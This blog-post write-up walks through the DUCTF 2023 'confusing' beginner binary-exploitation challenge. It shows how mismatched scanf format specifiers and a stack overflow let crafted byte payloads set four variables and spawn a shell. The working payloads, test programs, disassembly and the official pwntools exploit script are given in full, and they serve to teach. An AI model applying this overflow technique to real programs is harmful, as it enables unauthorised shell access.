---
layout: post
title: DUCTF 2023 writeup for 'confusing'
date: 2023-09-07
---

This walkthrough will analyze the `confusing` challenge from Down Under CTF 2023. This approach will take "the hard way," opting to analyze the lower-level details behind the official solution to the challenge. The intention is to provide a methodology behind the answer, to explain the low-level details behind each problem, and to explain Python's pwntools and struct packages a little more in depth. 

Although this was a "beginner" challenge, there is a lot of insight into how *scanf* works and how C stores data in memory. The intended audience is that of a beginner for binary exploitation. However, this may prove valuable to anyone who is interested in how the lower-level details of C and Assembly work, and how Python, as a tool for exploitation, is most effective once you have a stronger understanding of these foundations.

# The Problem

The problematic code is here:

```c
    short d;
    double f;
    char s[4];
    int z; 

    printf("Give me d: ");
    scanf("%lf", &d);

    printf("Give me s: ");
    scanf("%d", &s);

    printf("Give me f: ");
    scanf("%8s", &f);

    if (z == -1 && d == 13337 && f == 1.6180339887 && strncmp(s, "FLAG", 4) == 0) {
        system("/bin/sh");
    } else {
        // ...
```

Our goal is to set all four variables to the values specified within the *if* statement&mdash;this gives us a shell, direct access to the system. However, the use of improper format specifiers means that you cannot explicitly enter those target values into the terminal or STDIN. Further, there is no way to explicitly set the value of *z*.

# The Strategy

For now, let's forego the official solution. Their answer is fantastic, but it takes some of the fun out of the exercise. Instead, we will focus on the methodology as though this were an exercise in vulnerability research.

The key to the solution is knowing that C will implicity accept bytes and store data based on that input. The application will accept raw bytes via STDIN. (Python's *pwntools* and *struct* packages will make this process very easy, but they are not strictly needed, as we will see later.) 

With that in mind, we can execute the *system* function, and get the shell, by sending the bytes representation for each of the following situations:

- Convert *13337* to a long double (signed, 64 bits)
- Convert *FLAG* to a 32-bit integer
- Convert *1.6180339887* to an 8-byte (unsigned 64-bit) array
- Use integer underflow or overflow to set the value of *z* to *-1*

Let's analyze the compiled binary's hardening:

```
$ python3
Python 3.11.4 (main, Jun  7 2023, 10:13:09) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import ELF
>>> ELF('confusing')
[*] '/home/kali/confusing'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
ELF('/home/kali/confusing')
```

This gives us some key information. First, becuase the binary is "hardened enough," we probably don't need an esoteric or truly brilliant attack; in fact, we can probably solve this by sending the encoded conversions to STDIN. Second, because this binary is little endian (*amd-64-**little***), we will need to ensure that all bytes are "reversed" prior to sending them. Finally, the architecture is 64 bits (**amd64**), which means that any *double* values will have 64-bit precision.

# Setting d to 13337

The first conversion will take eight bytes from STDIN and store the last two inside the short (2 byte) integer *d*. This one is a little more involved because we can use the same input to set the value of *z*.

First, let's convert *13337* to hex.

```
>>> hex(13337)
'0x3419'
```

This resolves to a two-byte value, *0x3419*. Because we are working with little endian, we need to reverse these two bytes (becoming *0x1934*), and send this at the very beginning of the byte payload.

Before going any further, let's see how *pwntools* can support this task. The *p16* function will take some decimal input and convert it to a two-byte value. (We use the *hexlify* function only to illustrate the hex representation.)

```
>>> from binascii import hexlify
>>> p16(13337)
b'\x194'
>>> hexlify(p16(13337))
b'1934'
```

So, the first two bytes are *0x1934*. Recall that the format specifier *%lf* refers to a *long double*, which is 64 bits, or 8 bytes. This leaves 6 bytes remaining.

For now, we just want to focus on setting *d*, so only the first two bytes in the payload are relevant. The remaining six bytes can just be NOP characters, encoded as *0x90*. We can construct the payload in the correct format:

```
>>> hexlify(p16(13337) + b'\x90\x90\x90\x90\x90\x90')
b'1934909090909090'
```

Thus, if we send *0x1934909090909090* as a double, we should be able to set *d* to *0x3419*, or *13337*. 

As an exercise, you could do this conversion manually, but you'll need to note a few things things. First, recall that the application will read this value "backwards," so you'll need to work with the value *0x9090909090903419*. Second, you'll need to review (or teach yourself) [how floating-point values are stored in memory](https://towardsdatascience.com/binary-representation-of-the-floating-point-numbers-77d7364723f1) and, thus, in *binary*. You could also use an [hex-to-double converter](https://www.binaryconvert.com/result_double.html?hexadecimal=9090909090903419), making sure to provide the "reversed" number.

However, in Python, we can just use the *unpack* method. Per the documentation:

> Unpack from the buffer *buffer* (presumably packed by `pack(format, ...)`) according to the format string *format*. 

We can look up the format string for a *double* in the official docs: https://docs.python.org/3/library/struct.html#format-characters. In this case, a double has the format string *d*, and defaults to an 8-byte value. This should be sufficient for our payload.

```
>>> struct.unpack('d', p16(13337) + b'\x90\x90\x90\x90\x90\x90')
(-6.828527034388119e-229,)
```

Note that the result is a tuple. This is explicit in the docs:

> The result is a tuple even if it contains exactly one item. 

Since we are only operating on one value, we can take it from the resultant tuple, and convert that value to a string.

```
>>> struct.unpack('d', p16(13337) + b'\x90\x90\x90\x90\x90\x90')[0]
-6.828527034388119e-229
>>> str(struct.unpack('d', p16(13337) + b'\x90\x90\x90\x90\x90\x90')[0])
'-6.828527034388119e-229'
```

This gives us something that we can send to the application via STDIN.

To test our conversion, we can write a snippet of C code:

```c
#include <stdio.h>

int main() {
  short d;
  scanf("%lf", &d);
  printf("You entered:  0x%x  %d\n", d, d);
  return 0;
}
```

This will print both the hex and integer representations of the target value, *d*.

Compile and send the payload:

```
$ gcc test.c
$ echo '-6.828527034388119e-229' | ./a.out
You entered:  0x3419  13337
```

We will circle back to the official answer for this part. For now, know that we have successfully set *d* to *13337*. The first hurdle is overcome: three more to go.

# Setting s to FLAG

The next piece of logic is this:

```c
    char s[4];
    ...
    scanf("%d", &s);
		...
    strncmp(s, "FLAG", 4) == 0
```

The approach here is much simpler: 

1. Reverse FLAG &rightarrow; GLAF,
2. Represent each byte in the reversed string as a number, and
3. Take the 4-byte (32-bit) *integer* representation of that hex value.

We can do this in raw Python like so:

```
>>> # Reverse the string, 'FLAG'.
>>> target = "FLAG"[::-1]
>>> print(target)
GALF
>>> # Get each hex value in the string.
>>> for c in target:
...     print(hex(ord(c)), end=" ")
... 
0x47 0x41 0x4c 0x46
>>> # Construct the target integer.
>>> t = (0x47 << 24) | (0x41 << 16) | (0x4c << 8) | 0x46
>>> t
1195461702
>>> # Informational: Show that the integer is the encoding of 'GLAF'.
>>> from binascii import unhexlify
>>> hex(t)
'0x47414c46'
>>> unhexlify('47414c46').decode()
'GALF'
```

In this case, our payload is *1195461702*.

Note the use of bit-shifting (`<<`) and bitwise OR (`|`) in getting the value of *t*. Since this is a 32-bit integer, we want to align each character 8 bits from the previous one. This essentially does the following:

```
  47 00 00 00 
  00 41 00 00
  00 00 4c 00
+ 00 00 00 46
-------------
  47 41 4c 46
```

Pwntools makes this a little easier with its *unpack* function set. In this case, we need the *u32* function because we're targeting a 32-bit integer.

```
>>> u32(b'FLAG')
1195461702
>>> hex( u32(b'FLAG') )
'0x47414c46'
```

Notice that it took care of the endianness as well.

Note: Be mindful to pass a bytes-type, denoted by the leading `b`. If you don't, the interpreter will try to use the data as a string&mdash;but it will complain.

```
>>> u32('FLAG')
<stdin>:1: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
```

Again, we can prove our work:

```c
#include <stdio.h>

int main() {
  char s[4];
  scanf("%d", &s);
  printf("You entered:  0x%x  %s\n", *s, s);
  return 0;
}
```

And test it:

```
$ gcc test.c
$ echo '1195461702' | ./a.out
You entered:  0x46  FLAG
```

(In this case, the hex just tells you that *s* begins with character *0x46*, or 'F'.)

The official solution automates all of this in one line:

```python
conn.sendlineafter(b'Give me s: ', str(u32(b'FLAG')).encode())
```

# Setting f to 1.6180339887

The third hurdle:

```c
 double f;
 ...
 
 scanf("%8s", &f);
 ...
 
 f == 1.6180339887
 ...
```

Here, we need to use an array of 8 bytes to set a double, *f*. Because the binary is targeting a 64-bit operating system, this means that *f* is a 64-bit double. We only need to generate and send the bytes representation of *1.6180339887* to satisfy the equality. (See the references from the float-to-decimal section earlier for information on how to do this manually or by using a converter.)

For now, let's use *struct* and *hexlify*:

```
>>> hexlify(struct.pack('d', 1.6180339887))
b'e586949b77e3f93f'
```

So, we need to send *0xe586949b77e3f93f*. Unfortunately, we couldn't type this in to STDIN directly. We can prove this assertion by trying to use the *bytearray.fromhex* function:

```
>>> bytearray.fromhex(hexlify(struct.pack('d', 1.6180339887)).decode())
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
UnicodeDecodeError: 'utf-8' codec can't decode byte 0x9b in position 3: invalid start byte
```

Because byte *0x9b* is unprintable, we would need a workaround if we want to send this payload with `echo`. Fortunately,`echo` allows us to send raw bytes in one of two ways, both of which have the same result:

```bash
echo $'\x41\x41'   # Sends "AA"
echo -e '\x41\x41' # Also sends "AA"
```

Again, some test code, but with a modification to the print statement:

```c
#include <stdio.h>

int main() {
  double f;
  scanf("%8s", &f);
  printf("You entered:  %f  %d\n", f, f==1.6180339887);
  return 0;
}
```

Due to the way C interprets floats, it won't be a productive use of our time to print the hex string. In addition, *printf* has a tendency to "round up" floating-point values when it prints. As a workaround, our test case will evaluate if *f* really equals our target value; if it does, it prints a "1" to the console.

Let's test this:

```
$ gcc test.c
$ echo -e '\xe5\x86\x94\x9b\x77\xe3\xf9\x3f' | ./a.out
You entered:  1.618034  1
```

Again, in the official solution, all of this is automated in one line:

```python
conn.sendlineafter(b'Give me f: ', struct.pack('d', 1.6180339887))
```

# Setting z to -1

The final problem is setting *z*. If you send these payloads, the challenge is not quite solved. Further, there is no direct way to modify *z*, so we will have to rely on a technique like rollover or overflow.

However, we do know two key points:

- We have set *f* and *s* to values within their size range (8 and 4 bytes, respectively)
- We have set *d* to an 8-byte value, which is *above* its size range of 2 bytes

This should signal that a stack overflow is possible with the value of *d*. To investigate this, let's mock up a quick test solution for *z*. It should look very, very similar to the *confusing.c* code.

```c
#include <stdio.h>

int main() {

  short d;
  double f;
  char s[4];
  int z; 
   
  scanf("%lf", &d);
    
  s[0] = 'A'; s[1] = 'A'; s[2] = 'A'; s[3] = 'A';
  f = 1.0;

  printf("Value of z:  %x  %d\n", z, z);
}

```

Our goal is to see what *z* looks like after all other values have been set. We declare the same variables in the same order. We read *d*, and then set *s* and *f* to arbitrary values within their size range. (Their values don't matter yet, but they must be set, or else the compiler will omit them from the assembly.) 

Compile and run:

```
$ gcc test.c
$ echo '-6.828527034388119e-229' | ./a.out
Value of z:  90909090  -1869574000
```

So, *z* is set. How did this happen? 

Recall the first step, when we set *d* to *13337*, and padded it with *0x90* (NOP) characters. Here, *z* is a four-byte (32-bit) integer. It would appear that some of the padding from *d* overflowed into *z* and set its value to *0x90909090*, or *-1869574000*. 

We can prove this by analyzing the disassembly of our test code:

```
$ objdump -M intel -d a.out
0000000000001149 <main>:
    1149:       55                      push   rbp
    114a:       48 89 e5                mov    rbp,rsp
    114d:       48 83 ec 20             sub    rsp,0x20
    1151:       48 8d 45 f2             lea    rax,[rbp-0xe]
    1155:       48 89 c6                mov    rsi,rax
    1158:       48 8d 05 a9 0e 00 00    lea    rax,[rip+0xea9]        # 2008 <_IO_stdin_used+0x8>
    115f:       48 89 c7                mov    rdi,rax
    1162:       b8 00 00 00 00          mov    eax,0x0
    1167:       e8 d4 fe ff ff          call   1040 <__isoc99_scanf@plt>
    116c:       c6 45 ee 41             mov    BYTE PTR [rbp-0x12],0x41
    1170:       c6 45 ef 41             mov    BYTE PTR [rbp-0x11],0x41
    1174:       c6 45 f0 41             mov    BYTE PTR [rbp-0x10],0x41
    1178:       c6 45 f1 41             mov    BYTE PTR [rbp-0xf],0x41
    117c:       f2 0f 10 05 a4 0e 00    movsd  xmm0,QWORD PTR [rip+0xea4]        # 2028 <_IO_stdin_used+0x28>
    1183:       00 
    1184:       f2 0f 11 45 f8          movsd  QWORD PTR [rbp-0x8],xmm0
    1189:       8b 55 f4                mov    edx,DWORD PTR [rbp-0xc]
    118c:       8b 45 f4                mov    eax,DWORD PTR [rbp-0xc]
    118f:       89 c6                   mov    esi,eax
    1191:       48 8d 05 74 0e 00 00    lea    rax,[rip+0xe74]        # 200c <_IO_stdin_used+0xc>
    1198:       48 89 c7                mov    rdi,rax
    119b:       b8 00 00 00 00          mov    eax,0x0
    11a0:       e8 8b fe ff ff          call   1030 <printf@plt>
```

For analyzing the variables in the stack, the key lines are here:

```
    114d:       48 83 ec 20             sub    rsp,0x20
    ...
		1151:       48 8d 45 f2             lea    rax,[rbp-0xe]
		...
    116c:       c6 45 ee 41             mov    BYTE PTR [rbp-0x12],0x41
    ...
    1184:       f2 0f 11 45 f8          movsd  QWORD PTR [rbp-0x8],xmm0
    1189:       8b 55 f4                mov    edx,DWORD PTR [rbp-0xc]
    ...
```

At line 114d, 32 bytes (0x20 bytes) are allocated for local variables on the stack; this is more than enough for the four declared variables, at *8+4+2+4 = 18 bytes* total. At line 1151, we set up variable *d*, a short (2-byte) integer, as an argument to *scanf*. At line 1189, we pass *z*, a 4-byte integer, as an argument to *printf*. 

Using this data, we can visualize the boundaries of each variable:

- *f*: `0x0 - 0x8`
- *z*: `0x9 - 0xC`
- *d*: `0xD - 0xE`
- *s*: `0xF - 0x12`

Thus, we can infer that, when *d* is set, the **next four bytes** will overflow and set the value of *z*.

Let's go back to the payload from earlier: *0x1934909090909090*. If we can manipulate four bytes after *1934*, we can effectively set *z*. With that in mind, let's set those four bytes to *0xff*, the bytes equivalent of -1 for signed values.

```
>>> struct.unpack('d', p16(13337) + b'\xff\xff\xff\xff\x90\x90')
(-7.007969861245233e-229,)
```

Then run it in the test application:

```
$ echo '-7.007969861245233e-229' | ./a.out
Value of z:  ffffffff  -1
```

So, we have set all four variables.

The official solution sets *z* in a similar manner. The only difference is the last two bytes&mdash;which, again, don't matter for the solution.

```python
conn.sendlineafter(b'Give me d: ', str(struct.unpack('d', p16(13337) + b'\xff\xff\xff\xff\xff\xfe')[0]).encode())
```

# The official solution

With all of this in mind, it's a breath of fresh air to read the published answer:

```python
from pwn import *
import struct

conn = process('../publish/confusing')
conn.sendlineafter(b'Give me d: ', str(struct.unpack('d', p16(13337) + b'\xff\xff\xff\xff\xff\xfe')[0]).encode())
conn.sendlineafter(b'Give me s: ', str(u32(b'FLAG')).encode())
conn.sendlineafter(b'Give me f: ', struct.pack('d', 1.6180339887))
conn.interactive()
```

To test it, we can target the local binary. Make sure to change the path of the process target.

```
$ python3 confusing.py
[+] Starting local process './confusing': pid 725828
[*] Switching to interactive mode
$ whoami
kali
```

